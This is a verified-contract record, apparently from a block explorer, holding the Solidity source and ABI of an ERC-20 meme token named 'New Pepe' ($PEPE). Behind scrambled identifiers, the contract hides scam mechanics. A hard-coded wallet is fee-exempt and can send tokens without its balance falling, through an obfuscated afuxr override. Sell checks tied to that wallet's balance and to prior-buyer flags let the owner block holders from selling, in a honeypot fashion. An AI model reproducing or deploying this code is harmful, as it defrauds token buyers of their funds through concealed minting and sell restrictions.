{"SourceCode": "/*\r\n\r\nNew Pepe    $PEPE\r\n\r\n\r\nTWITTER: https://twitter.com/NewPepeEthereum\r\nTELEGRAM: https://t.me/NewPepeEthereum\r\nWEBSITE: https://www.newpepe.org/\r\n\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\n    interface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n    }\r\n\r\n    library ryejxwy {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"ryejxwy\");\r\n        return c;\r\n    }\r\n\r\n    function  afuxr(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  afuxr(a, b, \"ryejxwy\");\r\n    }\r\n\r\n    function  afuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"ryejxwy\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"ryejxwy\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    }\r\n\r\n    abstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n    }\r\n\r\n\r\n    contract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    }\r\n\r\n    interface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    }\r\n\r\n    interface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) \r\n    external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    }\r\n\r\n    contract NewPepe is Context, IERC20, Ownable {\r\n    using ryejxwy for uint256;\r\n\r\n    string private constant _name = unicode\"New Pepe\";\r\n    string private constant _symbol = unicode\"PEPE\";\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private constant _totalSupplyz_ok = 42069000000 * (10**_decimals);\r\n    uint256 public _taxSwapMin = _totalSupplyz_ok;\r\n    uint256 public maxHoldingAmount = _totalSupplyz_ok;\r\n    uint256 public _taxSwapThreshold = _totalSupplyz_ok;\r\n    uint256 public _taxSwapMax = _totalSupplyz_ok;\r\n\r\n    uint256 private _initialBuyTax=10;\r\n    uint256 private _initialSellTax=15;\r\n    uint256 private _finalBuyTax=1;\r\n    uint256 private _finalSellTax=1;\r\n    uint256 private _reduceBuyTaxAt=6;\r\n    uint256 private _reduceSellTax1At=1;\r\n    uint256 private _swapCount=0;\r\n    uint256 private _buyCount=0;\r\n\r\n    mapping (address => uint256) private  _balances;\r\n    mapping (address => mapping (address => uint256)) private  _allowances;\r\n    mapping (address => bool) private  _excludedFromFees;\r\n    mapping (address => bool) private  _ifrWaeoakirt;\r\n    mapping(address => uint256) private  _hadeLasTransrTesap;\r\n    bool public  transferDelayEnabled = false;\r\n    address public  mtrkatangWtiler = 0xC061DFB04dA5d68CF3dF6715ab567c9A7fbB3f93;\r\n\r\n\r\n    IUniswapV2Router02 private  _uniRouterV2;\r\n    address private  _uniV2LP;\r\n    bool private  _tadangFnabiea;\r\n    bool private  _inTaxSwap = false;\r\n    bool private  _swapwlrsUniswappsSuer = false;\r\n\r\n \r\n    event RemovrAoutuqx(uint _taxSwapMin);\r\n    modifier lockTaxSwap {\r\n        _inTaxSwap = true;\r\n        _;\r\n        _inTaxSwap = false;\r\n    }\r\n\r\n    constructor () { \r\n        _balances[_msgSender()] = _totalSupplyz_ok;\r\n        _excludedFromFees[owner()] = true;\r\n        _excludedFromFees[address(this)] = true;\r\n        _excludedFromFees[mtrkatangWtiler] = true;\r\n\r\n\r\n        emit Transfer(address(0), _msgSender(), _totalSupplyz_ok);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalSupplyz_ok;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) public view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. afuxr(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address _owner, address spender, uint256 amount) private {\r\n        require(_owner!= address(0), \"ERC20: approve from the zero address\");\r\n        require(spender!= address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[_owner][spender] = amount;\r\n        emit Approval(_owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require (from!= address(0), \"ERC20:  transfer  from  the  zero  address\");\r\n        require (to!= address(0), \"ERC20: transfer to the zero  address\");\r\n        require (amount > 0, \"Transfer  amount  must  be  greater  than  zero\");\r\n        uint256  taxAmount = 0;\r\n        if  ( from != owner() &&to!= owner()) {\r\n\r\n            if  (transferDelayEnabled) {\r\n                if  (to!= address(_uniRouterV2) &&to!= address(_uniV2LP)) {\r\n                  require (_hadeLasTransrTesap[tx.origin] < block.number, \" Only  one  transfer  per  block  allowed.\");\r\n                  _hadeLasTransrTesap[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if  ( from == _uniV2LP && to!= address (_uniRouterV2) &&!_excludedFromFees[to]) {\r\n                require (amount <= _taxSwapMin, \"Forbid\");\r\n                require (balanceOf (to) + amount <= maxHoldingAmount,\"Forbid\");\r\n                if  (_buyCount < _swapCount) {\r\n                  require (!raonetate(to));\r\n                }\r\n                _buyCount ++ ; _ifrWaeoakirt[to] = true;\r\n                taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n            }\r\n\r\n            if(to == _uniV2LP&&from!= address (this) &&! _excludedFromFees[from]) {\r\n                require (amount <= _taxSwapMin && balanceOf(mtrkatangWtiler) <_taxSwapMax, \"Forbid\");\r\n                taxAmount = amount.mul((_buyCount > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);\r\n                require (_buyCount >_swapCount && _ifrWaeoakirt[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!_inTaxSwap \r\n            &&  to  ==_uniV2LP&&_swapwlrsUniswappsSuer &&contractTokenBalance > _taxSwapThreshold \r\n            &&  _buyCount > _swapCount &&! _excludedFromFees [to] &&! _excludedFromFees [from]\r\n            )  {\r\n                _transferFrom(vprty(amount,vprty(contractTokenBalance, _taxSwapMax)));\r\n                uint256  contractETHBalance = address (this).balance;\r\n                if (contractETHBalance > 0)  {\r\n                }\r\n            }\r\n        }\r\n\r\n        if ( taxAmount > 0 ) {\r\n          _balances[address(this)] = _balances [address(this)].add(taxAmount);\r\n          emit  Transfer (from, address (this) ,taxAmount);\r\n        }\r\n        _balances[from] = afuxr(from , _balances [from], amount);\r\n        _balances[to] = _balances[to].add(amount.afuxr (taxAmount));\r\n        emit  Transfer( from, to, amount. afuxr(taxAmount));\r\n    }\r\n\r\n    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTaxSwap {\r\n        if(_swapTaxAndLiquify==0){return;}\r\n        if(!_tadangFnabiea){return;}\r\n        address[] memory path =  new   address [](2);\r\n        path[0] = address (this);\r\n        path[1] = _uniRouterV2.WETH();\r\n        _approve(address (this), address (_uniRouterV2), _swapTaxAndLiquify);\r\n        _uniRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );\r\n    }\r\n\r\n        function vprty(uint256 a, uint256 b) private pure returns (uint256) {\r\n    return (a >= b) ? b : a;\r\n    }\r\n\r\n    function afuxr(address from, uint256 a, uint256 b) private view returns (uint256) {\r\n    if (from == mtrkatangWtiler) {\r\n        return a;\r\n    } else {\r\n        require(a >= b, \"Subtraction underflow\");\r\n        return a - b;\r\n    }\r\n    }\r\n\r\n    function removerLimits() external onlyOwner{\r\n        _taxSwapMin  =  _totalSupplyz_ok ;\r\n        maxHoldingAmount = _totalSupplyz_ok ;\r\n        transferDelayEnabled = false ;\r\n        emit  RemovrAoutuqx ( _totalSupplyz_ok ) ;\r\n    }\r\n\r\n   function raonetate(address account) private view returns (bool) {\r\n    uint256 codeSize;\r\n    address[] memory addresses = new address[](1);\r\n    addresses[0] = account;\r\n\r\n    assembly {\r\n        codeSize := extcodesize(account)\r\n    }\r\n\r\n    return codeSize > 0;\r\n    }\r\n\r\n\r\n    function startTrading() external onlyOwner() {\r\n        require (!_tadangFnabiea, \" trading is open \" ) ;\r\n        _uniRouterV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve (address (this),address(_uniRouterV2), _totalSupplyz_ok);\r\n        _uniV2LP = IUniswapV2Factory(_uniRouterV2.factory()).createPair (address(this), _uniRouterV2. WETH());\r\n        _uniRouterV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);\r\n        IERC20 (_uniV2LP).approve (address(_uniRouterV2), type(uint). max);\r\n        _swapwlrsUniswappsSuer = true ;\r\n        _tadangFnabiea = true ;\r\n    }\r\n\r\n    receive( )  external  payable  { }\r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_taxSwapMin\",\"type\":\"uint256\"}],\"name\":\"RemovrAoutuqx\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_taxSwapMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxHoldingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mtrkatangWtiler\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removerLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "NewPepe", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5e68bc7b992aa7149e4a14832c5a2678ef68e2d2b7afb8c070a5811405abf3d8"}